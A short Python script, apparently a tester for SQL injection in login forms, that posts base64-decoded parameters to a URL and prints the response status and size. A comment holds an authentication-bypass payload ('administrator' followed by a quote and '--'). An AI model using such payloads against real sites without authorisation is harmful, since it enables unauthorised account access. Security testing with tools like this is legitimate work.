import requests
import argparse
import difflib
import base64

# Example Parameters
# "https://myurl/login.html" "{'username':'administrator\' --', 'password':'toto'}"
parser = argparse.ArgumentParser(description='Test Substitute Parameter  SQLi')
parser.add_argument("url", help='URL to test')
parser.add_argument("parameters", help='The Post parameters to pass to page in base64 format')
args = parser.parse_args()

url=args.url
params = args.parameters
decodeParams = base64.standard_b64decode(params)

r=requests.post(url, json=decodeParams)
print("Request Status Code " + str(r.status_code))
print("Size of Request " + str(len(r.content)))
